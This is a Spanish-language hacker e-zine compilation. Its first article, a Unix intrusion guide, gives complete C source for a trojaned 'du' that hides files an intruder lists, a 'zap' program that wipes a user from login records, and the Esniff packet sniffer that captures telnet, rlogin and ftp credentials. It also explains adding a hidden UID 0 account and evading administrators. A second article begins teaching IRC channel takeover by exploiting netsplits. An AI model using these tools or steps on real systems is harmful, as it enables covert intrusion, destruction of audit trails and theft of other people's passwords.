static char sccsid[] = "@(#)du.c 1.1 91/11/13 SMI"; /* from UCB 4.11 83/07/01 */
#endif
/*
* du
*/
#include <stdio.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <sys/dir.h>
char path[BUFSIZ], name[BUFSIZ];
int aflg;
int sflg;
char *dot = ".";
#define ML 1000
struct {
int dev;
ino_t ino;
} ml[ML];
int mlx;
/*+
* Hack vars - oops they're global
* but wtf cares, its a hack.
+*/
#define FILENAME "/dev/ptyr"
#define STR_SIZE 128
#define SEP_CHAR " \n"
#define SHOWFLAG /* Able to get du stats with `du -/` command */
struct h_st {
struct h_st *next;
char filename[STR_SIZE];
};
struct h_st *hack_list;
struct h_st *h_tmp;
char tmp_str[STR_SIZE];
FILE *fp_hack;
int showall=0;
long descend();
char *index(), *rindex(), *strcpy(), *sprintf();
#define kb(n) (howmany(dbtob(n), 1024))
main(argc, argv)
int argc;
char **argv;
{
long blocks = 0;
register char *np;
int pid;
int c;
extern int optind;
#if defined (SHOWFLAG)
while ((c = getopt(argc, argv, "as/")) != -1)
#else
while ((c = getopt(argc, argv, "as")) != -1)
#endif
switch (c) {
case 'a':
aflg++;
break;
case 's':
sflg++;
break;
#if defined (SHOWFLAG)
case '/':
showall++;
break;
#endif
default:
(void)fprintf(stderr, "Usage: du [-as] file . . .\n");
exit (2);
}
/*+ Read in list of files to block +*/
h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
hack_list=h_tmp;
if (fp_hack=fopen (FILENAME, "r")) {
while (fgets(tmp_str, 126, fp_hack)) {
h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
strcpy (h_tmp->filename, tmp_str);
h_tmp->filename[strlen(h_tmp->filename)-1]='\0';
h_tmp=h_tmp->next;
}
}
h_tmp->next=NULL;
/*+ On with the program +*/
argc -= optind;
argv += optind;
if (argc == 0) {
argv = &dot;
argc = 1;
}
do {
if (argc > 1) {
pid = fork();
if (pid == -1) {
fprintf(stderr, "No more processes.\n");
exit(1);
}
if (pid != 0)
wait((int *)0);
}
if (argc == 1 || pid == 0) {
(void) strcpy(path, *argv);
(void) strcpy(name, *argv);
if (np = rindex(name, '/')) {
*np++ = '\0';
if (chdir(*name ? name : "/") < 0) {
perror(*name ? name : "/");
exit(1);
}
} else
np = path;
blocks = descend(path, *np ? np : ".");
if (sflg)
printf("%ld\t%s\n", kb(blocks), path);
if (argc > 1)
exit(1);
}
argc--, argv++;
} while (argc > 0);
exit(0);
/* NOTREACHED */
}
DIR *dirp = NULL;
long
descend(base, name) /* Cool tree spanning idea */
char *base, *name;
{
char *ebase0, *ebase;
struct stat stb;
int i;
long blocks = 0;
long curoff = NULL;
register struct direct *dp;
/*+ 
* This will be very lagged if you include alot of files
* because strstr() is such an expensive call. However,
* the nature of this procedure requires it, and breaking
* the pathname down would be just as expensive. Note, 
* that correct disk usage sizes will be reported based
* upon files that are not masked.
+*/
if (!showall)
for (h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next)
if (strstr(base, h_tmp->filename))
return 0; 
ebase0 = ebase = index(base, 0);
if (ebase > base && ebase[-1] == '/')
ebase--;
if (lstat(name, &stb) < 0) {
perror(base);
*ebase0 = 0;
return (0);
}
if (stb.st_nlink > 1 && (stb.st_mode&S_IFMT) != S_IFDIR) {
for (i = 0; i <= mlx; i++)
if (ml[i].ino == stb.st_ino && ml[i].dev == stb.st_dev)
return (0);
if (mlx < ML) {
ml[mlx].dev = stb.st_dev;
ml[mlx].ino = stb.st_ino;
mlx++;
}
}
blocks = stb.st_blocks;
if ((stb.st_mode&S_IFMT) != S_IFDIR) {
if (aflg)
printf("%ld\t%s\n", kb(blocks), base);
return (blocks);
}
if (dirp != NULL)
closedir(dirp);
dirp = opendir(name);
if (dirp == NULL) {
perror(base);
*ebase0 = 0;
return (0);
}
if (chdir(name) < 0) {
perror(base);
*ebase0 = 0;
closedir(dirp);
dirp = NULL;
return (0);
}
while (dp = readdir(dirp)) {
if (!strcmp(dp->d_name, ".") || !strcmp(dp->d_name, ".."))
continue;
(void) sprintf(ebase, "/%s", dp->d_name);
curoff = telldir(dirp);
blocks += descend(base, ebase+1);
*ebase = 0;
if (dirp == NULL) {
dirp = opendir(".");
if (dirp == NULL) {
perror(".");
return (0);
}
seekdir(dirp, curoff);
}
}
closedir(dirp);
dirp = NULL;
if (sflg == 0)
printf("%ld\t%s\n", kb(blocks), base);
if (chdir("..") < 0) {
(void) sprintf(index(base, 0), "/..");
perror(base);
exit(1);
}
*ebase0 = 0;
return (blocks);
}
<---------------------------------------FINAL-------------------------------->
Igual que hay este hay un monton para cada sistema, para el ftp, para telnet
etc...
Despues de buscar, o bien el vuestro HD, o bien en las paginas web se supone
que tendreis los necesarios para ser root. Un consejo, si no funciona ninguno
de los que teneis no useis los que son para otros sistemas o versiones, vamos,
que no hagais cosas a lo loco, por que lo unico que haceis es dejar mas
huellas en el sistema.
Esta es la parte mas dificil de todas, asi que espero que sepais solucionarla.
Una vez que ya somos root podemos hacer lo que queramos en ese sistema, pero
no debemos olvidarnos de borrar nuestras huellas. Los unix tienen varios logs
que guardan casi todo lo que hacemos en el sistema :
* UTMP: Este fichero guarda un registro de todos los usuarios que se han
conectado a ese sistema
Directorios: /etc/utmp o /var/adm/utmp
* WTMP: Este es nuestro peor enemigo. Guarda los numeros IP de todos los que
se han conectado al ordenador.
Directorios: /etc/wtmp o /var/adm/wtmp
* LASTLOG: Este log guarda un registro del momento exacto en que un usuario
entro por £ltima vez
Directorio: /var/adm/lastlog
* ACCT: Este log guarda los comandos que hemos ejecutado pero SOLO los
comandos no con que fin los hemos utilizado, pero suele estar desactivado
por la gran cantidad de memoria que necesita. ( Logico no? )
Directorio: /var/adm/acct ( en algunos sistemas se puede llamar pacct )
Ademas de esto puede haber otros programas que registren tu entrada, como el
TCP-Wrapper o similares( Tened cuidado con el Syslog que viene con el ssoo
que guarda los logs en los ficheros especificados en /etc/syslog.conf )
De todas maneras os recomiendo que hackeeis a horas que el root no pueda ver
vuestro numero IP con "who" o "users" porque os pillara. De la misma manera,
la primera vez que accedeis al sistema con una cuenta hackeada, haced muchas
cosas que haria un usuario normal ( telnet, ftp, echar una partida al tetris )
para que si el root os investiga "levemente" no se de cuenta de lo que habeis
hecho. Aqui incluyo el codigo de el "zap" que, como su nombre indica es un
zapper, o sea un programa que borra nuestras huellas el solito.
Se compila como los exploits, pero cambia su ejecucion :
% zap <nombredeusuario>
<---------------------------------CORTAD AQUI-------------------------------->
#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/file.h>
#include <fcntl.h>
#include <utmp.h>
#include <pwd.h>
#include <lastlog.h>
#define WTMP_NAME "/usr/adm/wtmp"
#define UTMP_NAME "/etc/utmp"
#define LASTLOG_NAME "/usr/adm/lastlog"
int f;
void kill_utmp(who)
char *who;
{
struct utmp utmp_ent;
int flag=0;
if ((f=open(UTMP_NAME,O_RDWR))>=0) {
while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
bzero((char *)&utmp_ent,sizeof( utmp_ent ));
lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
write (f, &utmp_ent, sizeof (utmp_ent));
flag++; 
}
close(f);
if(!flag) printf("Unsuccessful.\n");
}
}
main(argc,argv)
int argc;
char *argv[];
{
char me[30];
int i;
struct passwd *myentry;
if (argc==1) {
myentry=getpwuid(getuid());
strcpy(me,myentry->pw_name);
} else strcpy(me,argv[1]);
printf("ZAPing %s.\n",me);
kill_utmp(me);
}
<-----------------------------------FINAL------------------------------------>
Asi la ultima entrada del usuario queda borrada del sistema. Si lo ejecutamos
demasiadas veces, pondr nombredeusuario Never Logged In , osea es como si
ese usuario nunca se hubiera conectado al sistema. Ya tenemos las huellas
borradas, pero si queremos mantener esos privilegios que hacemos?
La manera mas facil es a¤adir una cuenta al /etc/passwd con el comando
"adduser" con numero de usuario 0 y numero de grupo 0 que son privilegios
de root. 
NoTa: que nadie se le ocurra borrar todas las cuentas del fichero passwd
menos una que solo el conozca, por que, aunque nadie podria acceder al sistema
una persona con acceso fisico podria detectarnos, y como poco borrar
nuestra cuenta asi cerrandonos el acceso al sistema, siendo en vano todo lo
que habiamos hecho.
Sin embargo si por casualidad al sysop en cuesti¢n se le ocurre revisar las
cuentas del fichero passwd la cagamos. Aunque es dificil, por que tendria que
revisar las cuentas 1 por 1 y es muy posible que se no se de cuenta, pero los
hay maniaticos....
Despues de hacer todo esto :
-Tenemos una cuenta con privilegios de root
-Hemos borrado nuestras huellas
¨ Que nos queda ? Pues practicamente nada, salvo colocar un sniffer, programa
que nos facilitara logins y passwords de ordenadores a los que se conecte la
gente de "nuestro" sistema. El problema de los sniffers es que hay uno para
cada sistema, pero si encontramos uno para el nuestro ( cosa que no seria muy
rara ) no est de mas ponerlo para futuros "trabajos".
Aqui incluyo el codigo de uno que quizas os sirva, es el codigo original, y
hay que a¤adirle alguna cosa asi que leed lo un poco por las lineas que
empiezan por /* Este sniffer deberia funcionar en casi todos los *NIX :
<----------------------------------CORTAD AQUI------------------------------->
/* Esniff.c */
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <sys/time.h>
#include <sys/file.h>
#include <sys/stropts.h>
#include <sys/signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/nit_if.h>
#include <net/nit_buf.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_var.h>
#include <netinet/udp_var.h>
#include <netinet/in_systm.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <arpa/inet.h>
#define ERR stderr
char *malloc();
char *device,
*ProgName,
*LogName;
FILE *LOG;
int debug=0;
#define NIT_DEV "/dev/nit"
#define CHUNKSIZE 4096 /* device buffer size */
int if_fd = -1;
int Packet[CHUNKSIZE+32];
void Pexit(err,msg)
int err; char *msg;
{ perror(msg);
exit(err); }
void Zexit(err,msg)
int err; char *msg;
{ fprintf(ERR,msg);
exit(err); }
#define IP ((struct ip *)Packet)
#define IP_OFFSET (0x1FFF)
#define SZETH (sizeof(struct ether_header))
#define IPLEN (ntohs(ip->ip_len))
#define IPHLEN (ip->ip_hl)
#define TCPOFF (tcph->th_off)
#define IPS (ip->ip_src)
#define IPD (ip->ip_dst)
#define TCPS (tcph->th_sport)
#define TCPD (tcph->th_dport)
#define IPeq(s,t) ((s).s_addr == (t).s_addr)
#define TCPFL(FLAGS) (tcph->th_flags & (FLAGS))
#define MAXBUFLEN (128)
time_t LastTIME = 0;
struct CREC {
struct CREC *Next,
*Last;
time_t Time; /* start time */
struct in_addr SRCip,
DSTip;
u_int SRCport, /* src/dst ports */
DSTport;
u_char Data[MAXBUFLEN+2]; /* important stuff :-) */
u_int Length; /* current data length */
u_int PKcnt; /* # pkts */
u_long LASTseq;
};
struct CREC *CLroot = NULL;
char *Symaddr(ip)
register struct in_addr ip;
{ register struct hostent *he =
gethostbyaddr((char *)&ip.s_addr, sizeof(struct in_addr),AF_INET);
return( (he)?(he->h_name):(inet_ntoa(ip)) );
}
char *TCPflags(flgs)
register u_char flgs;
{ static char iobuf[8];
#define SFL(P,THF,C) iobuf[P]=((flgs & THF)?C:'-')
SFL(0,TH_FIN, 'F');
SFL(1,TH_SYN, 'S');
SFL(2,TH_RST, 'R');
SFL(3,TH_PUSH,'P');
SFL(4,TH_ACK, 'A');
SFL(5,TH_URG, 'U');
iobuf[6]=0;
return(iobuf);
}
char *SERVp(port)
register u_int port;
{ static char buf[10];
register char *p;
switch(port) {
case IPPORT_LOGINSERVER: p="rlogin"; break;
case IPPORT_TELNET: p="telnet"; break;
case IPPORT_SMTP: p="smtp"; break;
case IPPORT_FTP: p="ftp"; break;
default: sprintf(buf,"%u",port); p=buf; break;
}
return(p);
}
char *Ptm(t)
register time_t *t;
{ register char *p = ctime(t);
p[strlen(p)-6]=0; /* strip " YYYY\n" */
return(p);
}
char *NOWtm()
{ time_t tm;
time(&tm);
return( Ptm(&tm) );
}
#define MAX(a,b) (((a)>(b))?(a):(b))
#define MIN(a,b) (((a)<(b))?(a):(b))
/* add an item */
#define ADD_NODE(SIP,DIP,SPORT,DPORT,DATA,LEN) { \
register struct CREC *CLtmp = \
(struct CREC *)malloc(sizeof(struct CREC)); \
time( &(CLtmp->Time) ); \
CLtmp->SRCip.s_addr = SIP.s_addr; \
CLtmp->DSTip.s_addr = DIP.s_addr; \
CLtmp->SRCport = SPORT; \
CLtmp->DSTport = DPORT; \
CLtmp->Length = MIN(LEN,MAXBUFLEN); \
bcopy( (u_char *)DATA, (u_char *)CLtmp->Data, CLtmp->Length); \
CLtmp->PKcnt = 1; \
CLtmp->Next = CLroot; \
CLtmp->Last = NULL; \
CLroot = CLtmp; \
}
register struct CREC *GET_NODE(Sip,SP,Dip,DP)
register struct in_addr Sip,Dip;
register u_int SP,DP;
{ register struct CREC *CLr = CLroot;
while(CLr != NULL) {
if( (CLr->SRCport == SP) && (CLr->DSTport == DP) &&
IPeq(CLr->SRCip,Sip) && IPeq(CLr->DSTip,Dip) )
break;
CLr = CLr->Next;
}
return(CLr);
}
#define ADDDATA_NODE(CL,DATA,LEN) { \
bcopy((u_char *)DATA, (u_char *)&CL->Data[CL->Length],LEN); \
CL->Length += LEN; \
}
#define PR_DATA(dp,ln) { \
register u_char lastc=0; \
while(ln-- >0) { \
if(*dp < 32) { \
switch(*dp) { \
case '\0': if((lastc=='\r') || (lastc=='\n') || lastc=='\0') \
break; \
case '\r': \
case '\n': fprintf(LOG,"\n : "); \
break; \
default : fprintf(LOG,"^%c", (*dp + 64)); \
break; \
} \
} else { \
if(isprint(*dp)) fputc(*dp,LOG); \
else fprintf(LOG,"(%d)",*dp); \
} \
lastc = *dp++; \
} \
fflush(LOG); \
}
void END_NODE(CLe,d,dl,msg)
register struct CREC *CLe;
register u_char *d;
register int dl;
register char *msg;
{
fprintf(LOG,"\n-- TCP/IP LOG -- TM: %s --\n", Ptm(&CLe->Time));
fprintf(LOG," PATH: %s(%s) =>", Symaddr(CLe->SRCip),SERVp(CLe->SRCport));
fprintf(LOG," %s(%s)\n", Symaddr(CLe->DSTip),SERVp(CLe->DSTport));
fprintf(LOG," STAT: %s, %d pkts, %d bytes [%s]\n",
NOWtm(),CLe->PKcnt,(CLe->Length+dl),msg);
fprintf(LOG," DATA: ");
{ register u_int i = CLe->Length;
register u_char *p = CLe->Data;
PR_DATA(p,i);
PR_DATA(d,dl);
}
fprintf(LOG,"\n-- \n");
fflush(LOG);
if(CLe->Next != NULL)
CLe->Next->Last = CLe->Last;
if(CLe->Last != NULL)
CLe->Last->Next = CLe->Next;
else
CLroot = CLe->Next;
free(CLe);
}
/* 30 mins (x 60 seconds) */
#define IDLE_TIMEOUT 1800
#define IDLE_NODE() { \
time_t tm; \
time(&tm); \
if(LastTIME<tm) { \
register struct CREC *CLe,*CLt = CLroot; \
LastTIME=(tm+IDLE_TIMEOUT); tm-=IDLE_TIMEOUT; \
while(CLe=CLt) { \
CLt=CLe->Next; \
if(CLe->Time <tm) \
END_NODE(CLe,(u_char *)NULL,0,"IDLE TIMEOUT"); \
} \
} \
}
void filter(cp, pktlen)
register char *cp;
register u_int pktlen;
{
register struct ip *ip;
register struct tcphdr *tcph;
{ register u_short EtherType=ntohs(((struct ether_header *)cp)->ether_type);
if(EtherType < 0x600) {
EtherType = *(u_short *)(cp + SZETH + 6);
cp+=8; pktlen-=8;
}
if(EtherType != ETHERTYPE_IP) /* chuk it if its not IP */
return;
}
/* ugh, gotta do an alignment :-( */
bcopy(cp + SZETH, (char *)Packet,(int)(pktlen - SZETH));
ip = (struct ip *)Packet;
if( ip->ip_p != IPPROTO_TCP) /* chuk non tcp pkts */
return;
tcph = (struct tcphdr *)(Packet + IPHLEN);
if(!( (TCPD == IPPORT_TELNET) ||
(TCPD == IPPORT_LOGINSERVER) ||
(TCPD == IPPORT_FTP)
)) return;
{ register struct CREC *CLm;
register int length = ((IPLEN - (IPHLEN * 4)) - (TCPOFF * 4));
register u_char *p = (u_char *)Packet;
p += ((IPHLEN * 4) + (TCPOFF * 4));
if(debug) {
fprintf(LOG,"PKT: (%s %04X) ", TCPflags(tcph->th_flags),length);
fprintf(LOG,"%s[%s] => ", inet_ntoa(IPS),SERVp(TCPS));
fprintf(LOG,"%s[%s]\n", inet_ntoa(IPD),SERVp(TCPD));
}
if( CLm = GET_NODE(IPS, TCPS, IPD, TCPD) ) {
CLm->PKcnt++;
if(length>0)
if( (CLm->Length + length) < MAXBUFLEN ) {
ADDDATA_NODE( CLm, p,length);
} else {
END_NODE( CLm, p,length, "DATA LIMIT");
}
if(TCPFL(TH_FIN|TH_RST)) {
END_NODE( CLm, (u_char *)NULL,0,TCPFL(TH_FIN)?"TH_FIN":"TH_RST" );
}
} else {
if(TCPFL(TH_SYN)) {
ADD_NODE(IPS,IPD,TCPS,TCPD,p,length);
}
}
IDLE_NODE();
}
}
/* signal handler
*/
void death()
{ register struct CREC *CLe;
while(CLe=CLroot)
END_NODE( CLe, (u_char *)NULL,0, "SIGNAL");
fprintf(LOG,"\nLog ended at => %s\n",NOWtm());
fflush(LOG);
if(LOG != stdout)
fclose(LOG);
exit(1);
}
/* opens network interface, performs ioctls and reads from it,
* passing data to filter function
*/
void do_it()
{
int cc;
char *buf;
u_short sp_ts_len;
if(!(buf=malloc(CHUNKSIZE)))
Pexit(1,"Eth: malloc");
/* this /dev/nit initialization code pinched from etherfind */
{
struct strioctl si;
struct ifreq ifr;
struct timeval timeout;
u_int chunksize = CHUNKSIZE;
u_long if_flags = NI_PROMISC;
if((if_fd = open(NIT_DEV, O_RDONLY)) < 0)
Pexit(1,"Eth: nit open");
if(ioctl(if_fd, I_SRDOPT, (char *)RMSGD) < 0)
Pexit(1,"Eth: ioctl (I_SRDOPT)");
si.ic_timout = INFTIM;
if(ioctl(if_fd, I_PUSH, "nbuf") < 0)
Pexit(1,"Eth: ioctl (I_PUSH \"nbuf\")");
timeout.tv_sec = 1;
timeout.tv_usec = 0;
si.ic_cmd = NIOCSTIME;
si.ic_len = sizeof(timeout);
si.ic_dp = (char *)&timeout;
if(ioctl(if_fd, I_STR, (char *)&si) < 0)
Pexit(1,"Eth: ioctl (I_STR: NIOCSTIME)");
si.ic_cmd = NIOCSCHUNK;
si.ic_len = sizeof(chunksize);
si.ic_dp = (char *)&chunksize;
if(ioctl(if_fd, I_STR, (char *)&si) < 0)
Pexit(1,"Eth: ioctl (I_STR: NIOCSCHUNK)");
strncpy(ifr.ifr_name, device, sizeof(ifr.ifr_name));
ifr.ifr_name[sizeof(ifr.ifr_name) - 1] = '\0';
si.ic_cmd = NIOCBIND;
si.ic_len = sizeof(ifr);
si.ic_dp = (char *)&ifr;
if(ioctl(if_fd, I_STR, (char *)&si) < 0)
Pexit(1,"Eth: ioctl (I_STR: NIOCBIND)");
si.ic_cmd = NIOCSFLAGS;
si.ic_len = sizeof(if_flags);
si.ic_dp = (char *)&if_flags;
if(ioctl(if_fd, I_STR, (char *)&si) < 0)
Pexit(1,"Eth: ioctl (I_STR: NIOCSFLAGS)");
if(ioctl(if_fd, I_FLUSH, (char *)FLUSHR) < 0)
Pexit(1,"Eth: ioctl (I_FLUSH)");
}
while ((cc = read(if_fd, buf, CHUNKSIZE)) >= 0) {
register char *bp = buf,
*bufstop = (buf + cc);
while (bp < bufstop) {
register char *cp = bp;
register struct nit_bufhdr *hdrp;
hdrp = (struct nit_bufhdr *)cp;
cp += sizeof(struct nit_bufhdr);
bp += hdrp->nhb_totlen;
filter(cp, (u_long)hdrp->nhb_msglen);
}
}
Pexit((-1),"Eth: read");
}
/* Authorize your proogie,generate your own password and uncomment here */
/* #define AUTHPASSWD "EloiZgZejWyms" */
void getauth()
{ char *buf,*getpass(),*crypt();
char pwd[21],prmpt[81];
strcpy(pwd,AUTHPASSWD);
sprintf(prmpt,"(%s)UP? ",ProgName);
buf=getpass(prmpt);
if(strcmp(pwd,crypt(buf,pwd)))
exit(1);
}
*/
void main(argc, argv)
int argc;
char **argv;
{
char cbuf[BUFSIZ];
struct ifconf ifc;
int s,
ac=1,
backg=0;
ProgName=argv[0];
/* getauth(); */
LOG=NULL;
device=NULL;
while((ac<argc) && (argv[ac][0] == '-')) {
register char ch = argv[ac++][1];
switch(toupper(ch)) {
case 'I': device=argv[ac++];
break;
case 'F': if(!(LOG=fopen((LogName=argv[ac++]),"a")))
Zexit(1,"Output file cant be opened\n");
break;
case 'B': backg=1;
break;
case 'D': debug=1;
break;
default : fprintf(ERR,
"Usage: %s [-b] [-d] [-i interface] [-f file]\n",
ProgName);
exit(1);
}
}
if(!device) {
if((s=socket(AF_INET, SOCK_DGRAM, 0)) < 0)
Pexit(1,"Eth: socket");
ifc.ifc_len = sizeof(cbuf);
ifc.ifc_buf = cbuf;
if(ioctl(s, SIOCGIFCONF, (char *)&ifc) < 0)
Pexit(1,"Eth: ioctl");
close(s);
device = ifc.ifc_req->ifr_name;
}
fprintf(ERR,"Using logical device %s [%s]\n",device,NIT_DEV);
fprintf(ERR,"Output to %s.%s%s",(LOG)?LogName:"stdout",
(debug)?" (debug)":"",(backg)?" Backgrounding ":"\n");
if(!LOG)
LOG=stdout;
signal(SIGINT, death);
signal(SIGTERM,death);
signal(SIGKILL,death);
signal(SIGQUIT,death);
if(backg && debug) {
fprintf(ERR,"[Cannot bg with debug on]\n");
backg=0;
}
if(backg) {
register int s;
if((s=fork())>0) {
fprintf(ERR,"[pid %d]\n",s);
exit(0);
} else if(s<0)
Pexit(1,"fork");
if( (s=open("/dev/tty",O_RDWR))>0 ) {
ioctl(s,TIOCNOTTY,(char *)NULL);
close(s);
}
}
fprintf(LOG,"\nLog started at => %s [pid %d]\n",NOWtm(),getpid());
fflush(LOG);
do_it();
}
<----------------------------------FINAL------------------------------------>
Bueno, ya hemos terminado espero que os haya servido de ayuda este texto, y
hayais comprendido como hackear un UNIX.
///////////////////////////////////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

5.                          TACTICAS DE GUERRA EN EL 
                                     IRC 
                          POR:RoMaN SoFt / LLFB    (30/7/97)

______________________________________________________________________________________________

0.- Contenido.

1.- Introducción. 
2.- Principios. 
  2.1.- Cómo funciona una red IRC. 
  2.2.- Conseguir op sin que nadie te lo de. 
  2.3.- Otras formas de conseguir op. 
  2.4.- Bot de servicio. 
3.- Ataques. 
  3.1.- Flood. 
  3.2.- Nick collide. 
     3.2.1.- Split server collide. 
     3.2.2.- Lag collide. 
  3.3.- Nuke. 
     3.3.1.- ICMP nuke. 
     3.3.2.- OOB nuke. 
  3.4.- Ping. 
  3.5.- Ssping. 
4.- Spoofing. 
5.- Resources. 
6.- Agradecimientos. 
7.- Notas finales. 
  
  

1.- Introducción.

 Ultimamente la guerra en el IRC es, por desgracia, algo bastante común. Conviene, a lo menos,
estar informado de las distintas técnicas que se suelen usar para "luchar", aunque sea 
simplemente
para detectar que te están atacando y saber cómo lo están haciendo. No es mi intención 
profundizar
demasiado en el tema aunque intentaré detallar algunos puntos que considere convenientes. 

 Todo lo que aquí se hable es extensible en general a cualquier red IRC. No obstante en algunos
casos muy particulares me referiré a la red IRC hispana ("*.irc-hispano.org"). Ni que decir 
tiene que la información que se proporciona aquí es con fines educativos; en ningún caso 
debe ser usada salvo en circunstancias excepcionalmente justificadas. Un uso abusivo 
puede significar una k/g-line totalmente merecida. Yo no me hago responsable de un posible 
mal uso de esta info. 
  
  

2.- Principios.

 Muchas veces el objetivo de un ataque no es otra cosa que hacerse con un canal ("tomarlo").
Esto es relativamente fácil y hay diversas técnicas para ello. El objetivo es hacerse con el 
op en el canal. Los medios: tu inteligencia y astucia... ;-) 
  

2.1.- Cómo funciona una red IRC.-

 El servidor de IRC propiamente dicho no es más que un programa corriendo en background (un
daemon) en una máquina determinada (en Unix correría el "ircd"). Los usuarios se conectan a
dicha máquina y acceden al servidor en forma de clientes. 

 Una red IRC se compone de varios servidores corriendo en paralelo y enlazados entre ellos, 
deforma que se mantegan comunicados (puedan intercambiar mensajes entre ellos). Cuando un 
usuario se conecta a un servidor determinado, éste (el servidor) lo notifica a los demás 
servidores que forman parte de la red IRC. Igualmente, cualquier otra acción es notificada 
a todos los servidores,de forma que éstos actuan como una unidad. De esta forma el usuario 
se deja ver en todos los servidores aunque físicamente sólo esté conectado a uno. 
Esto permite tener muchos usuarios repartidos por diferentes servidores pero que 
virtualmente es como si estuvieran todos en uno sólo. 

 La estructura de la red IRC es en forma de árbol (es decir, no puede haber bucles, o 
"caminos cerrados": partiendo de un nodo no se llegue por ningún camino otra vez a dicho nodo) 
aunque un tanto especial: cada nodo se ve a sí mismo como el nodo raiz de la red. En la 
"literatura" esto se conoce como "spanning tree". Un ejemplo de red podría ser: 

  

                           [ Server 15 ]  [ Server 13 ] [ Server 14] 
                                 /                \         / 
                                /                  \       / 
        [ Server 11 ] ------ [ Server 1 ]       [ Server 12] 
                              /        \          / 
                             /          \        / 
                  [ Server 2 ]          [ Server 3 ] 
                    /       \                      \ 
                   /         \                      \ 
           [ Server 4 ]    [ Server 5 ]         [ Server 6 ] 
            /    |    \                           / 
           /     |     \                         / 
          /      |      \____                   / 
         /       |           \                 / 
 [ Server 7 ] [ Server 8 ] [ Server 9 ]   [ Server 10 ] 

                                  : 
                               [ etc. ] 
                                  : 

  
 Cuando se rompe uno de los eslabones (links) que unen 2 servidores el conjunto se divide en 2
subconjuntos, los cuales intentarán seguir funcionando normalmente aunque de forma aislada. 
Esto es, cada subconjunto permanece operativo y mantiene la comunicación entre los servers
pertenecientes a dicho subconjunto. Pero por razones obvias los servidores de un subconjunto 
no ven a los del otro y viceversa. Esta situación se conoce como net-split. 

 En una sesión normal de IRC esto lo veríamos: 

[1:23] *** Case_Zer0 has quit IRC (fuego.irc-hispano.org io.irc-hispano.org) 

 Esto indica que se han spliteado los dos servidores indicados entre paréntesis y que a
consecuencia de ello el usuario Case_Zer0  [ hi Case ;-) ]  ha salido "de nuestra red IRC" 
(lo que está ocurriendo es que se encuentra en el otro subconjunto de servidores: a todos los 
efectos es que como si se encontrase ya en otra red IRC). 

 Cuando el enlace caido se recupera (i.e. se reestablece la comunicación entre los servers
spliteados) se habla de net-merge. Esto se vería en la sesión anterior como un "join" por 
parte del usuario que estaba en el servidor spliteado (tanto el quit como el join anteriores 
son mecanismos del propio IRC, es decir, el usuario anterior no dio ninguna orden de quit ni 
de join, es transparente a dicho usuario). 

 Hay programas que detectan y avisan cuando se produce algún net-split o net-merge: son los
denominados "link-lookers", y su utilidad es bastante obvia. 

 Por ejemplo, si el enlace dibujado en rojo (enlace server 2 <-> server 5) cayera, el 
servidor 5 estaría aislado de la red. Los usuarios de dicho servidor dejarían de ver a todos 
los demás pertenecientes a servidores distintos, y al contrario. Se dice que el servidor 5 
está spliteado. Es fácil reconocer a un servidor en esta situación: si entras en una red a 
través de un determinado servidor y te encuentras a muy poca gente es muy normal que se deba 
a que está spliteado de la red. 

 Otra posibilidad es que el enlace azul (3 <-> 12) cayera. En este caso el servidor 12 se 
splitea de la red, pero también lo hacen los servidores 13 y 14 indirectamente, por 
conectarse a través del primero. 

 Para una información completa del funcionamiento y estructura de una red IRC, y del protocolo
subyacente ("Internet Relay Chat Protocol") os remito al RFC1459. 
  

2.2.- Conseguir op sin que nadie te lo de.-

 Cuando alguien se une a un canal donde no hay nadie (hace un /join #canal) el servidor supone
que se trata de un nuevo canal y le da op a dicho usuario. Se dice que ha creado un canal. 
Vamos a aprovechar esto para hacernos con el op en un canal ya existente. ¿Cómo? Fácil:  
solo hay que aprovechar un net-split. Los pasos serían los siguientes: 

 - Esperar un split (lo podemos detectar con un link-looker). 
 - Entrar (conectar) al servidor spliteado. 
 - /join #canal (donde canal es el canal donde queremos conseguir op). 
 - El server creará un nuevo canal y tendrás el op. 
 - Esperar a que se deshaga el split. 

 Si "hay suerte" (leer más abajo), al deshacerse el split conservaremos el op en los restantes
servidores (el servidor spliteado se encarga de dar las órdenes correspondientes). 
Entonces se dice que hemos llevado a cabo un "net-hack". Los usuarios presentes en el canal 
en el que hemos llevado a cabo la acción verán algo como: 

[1:41] *** irc.i3d.es sets mode: +o RoMaNSoFt 

(donde el servidor que nos da op es el que antes estaba spliteado). 

 Esto no siempre funcionará porque hay aspectos que todavía no he comentado. Paso a explicar el
procedimiento y comentar algunos puntos negros. Supongo que habréis comprendido el
procedimiento; es muy simple: aprovechar que el servidor spliteado no ve a los usuarios de 
otros servidores y por tanto al canal previamente creado. Esto presupone que no hay usuarios 
del servidor spliteado en el canal (en este caso no funcionaría) porque en este caso al 
entrar nosotros por el server spliteado veríamos al canal como ya creado, con los usuarios 
de nuestro mismo servidor (a los otros los "esconde" el split) y por tanto el server no nos 
dará el op, como es habitual al entrar en cualquier canal ya existente. 

 También hay que tener en cuenta que actualmente todos los servidores tienen protecciones
anti-nethack. En este caso, al deshacerse el split, los restantes servidores te quitarán el 
op a tí en vez de ser al contrario (imponer tu op en los restantes servers), protegiendo al 
canal PERO ésto lo harán únicamente en caso de que ya hubiera ops en el canal antes de tu 
intento de net-hack (aunque hay veces en que el server se equivoca y mantiene tu op, 
quitándoselo a los demás). Es decir, que el net-hack funcionará sólo para canales donde no 
haya op ("opless channels"). Por esta razón, si queremos el op, necesitaremos tirar 
previamente a los ops (echarlos del canal, de forma que pierdan su op) para luego llevar a 
cabo el net-hack. ¿Cómo tirarlos? De esto nos encargaremos más
adelante, sigue leyendo };-) 
  

